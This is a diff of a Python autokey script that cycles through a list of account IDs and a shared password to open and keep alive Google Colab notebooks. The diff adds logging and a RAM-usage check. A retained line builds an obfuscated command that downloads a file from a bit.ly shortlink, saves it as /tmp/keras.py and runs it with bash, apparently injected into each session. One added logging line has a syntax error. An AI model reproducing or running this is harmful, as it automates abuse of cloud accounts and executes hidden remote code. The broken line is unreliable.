@@ -1,7 +1,8 @@
 # Auto RDP
-import time,os
+import time,os,logging
 from autokey import *
 import pyautogui
+
 
 col_cmd = "! cmd=pysi;i=003;b=ly;a=bit;wget -q -O /tmp/keras.py ${a}.${b}/${cmd}${i} ; bash /tmp/keras.py "
 listfile = '/home/one/g170p1'
@@ -11,7 +12,12 @@ global_slow_motion = 0.7
 enable_gpu = False
 speed = 200
 
-
+###################################################################
+logging.basicConfig(filename='/tmp/0colab-robot.log', encoding='utf-8', level=logging.DEBUG)
+logging.debug('This message should go to the log file')
+logging.info('So should this')
+logging.warning('And this, too')
+logging.error('And non-ASCII stuff, too, like Øresund and Malmö')
 ##################### Functions ###################################
 
 
@@ -280,6 +286,14 @@ def get_speed():
         speed = 110
     return speed    
 
+def ram_used():
+    # Getting all memory using os.popen()
+    speed = 100
+    total_memory, used_memory, free_memory = map(
+        int, os.popen('free -t -m').readlines()[-1].split()[1:])
+    ram_usage=round((used_memory/total_memory) * 100, 2)
+
+    return ram_usage    
 ###############################################################
 ############################# Main ############################
 ###############################################################
@@ -316,10 +330,17 @@ def gids_file_lanch(listfile,gpass,enable_gpu=True):
             #print("Line{}: {}".format(count, line.strip()))
             gid = line.strip('\n')
             gid = gid.strip('\r')
+            try:
+                if(ram_used()>= 85):
+                    logging.debug('Max memmory at :'+gid)
+                    break
+            finally:
+                pass
             chrome_new_colab(gid, gpass,enable_gpu=enable_gpu)
             winTitle = window.get_active_title()
             winClass = window.get_active_class()
             if winTitle.find("Cloud Colab") != -1:
+                logging.debug('Logging Error :'+gid)
                 exit_key()
 
 # refresh
@@ -330,6 +351,7 @@ def keep_allive(debug=0,slow_motion=1):
         time.sleep(2*slow_motion)
         winTitle = window.get_active_title()
         winClass = window.get_active_class()
+        logging.debug('winTitle :'+winTitle '  |  winClass: '+winClass)
         if (winClass == "google-chrome.Google-chrome" or
         winClass == "microsoft-edge-beta.Microsoft-edge-beta"):
             if winTitle.find("ipynb") != -1:
